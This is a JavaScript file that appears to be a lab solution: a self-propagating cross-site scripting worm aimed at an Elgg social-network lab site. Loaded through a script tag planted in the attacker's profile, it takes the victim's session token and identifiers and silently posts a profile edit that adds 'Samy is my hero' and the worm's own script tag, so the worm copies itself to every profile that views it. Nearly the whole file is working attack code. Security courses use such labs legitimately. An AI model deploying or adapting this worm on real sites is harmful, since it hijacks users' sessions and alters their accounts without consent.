/**
* This the link approach.
* Type this is the attacker's About Me Section in his Profile Page
* <script type="text/javascript" src="http://localhost/task6-link.js"></script>
* 
* We need to move this file into /var/www/html/ on the attacker machine
*/

window.onload = function() {
        var headerTag = "<script id=\"worm\" type=\"text/javascript\" src=\"http://localhost/task6-link.js\">";
        var tailTag = "</" + "script>";
        var wormCode = encodeURIComponent(headerTag, tailTag);

        // set content description field and access level
	var desc = "&description=Samy is my hero" + wormCode;
	var accesslv = "&accesslevel[description]=2";
	desc += accesslv;
	
	// get name, guid, timestamp and token
	var name  = "&name=" + elgg.session.user.name;
	var guid  = "&guid=" + elgg.session.user.guid;
	var ts    = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
	var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

	// set target url
	var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
	var content = token + ts + name + desc + guid;

	// construct ajax request
	if (elgg.session.user.guid != 47) {
		// create and send ajax request to modify profile
		var Ajax = null;
		Ajax = new XMLHttpRequest();
		Ajax.open("POST", sendurl, true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
                Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
                Ajax.send(content);

	} 

}

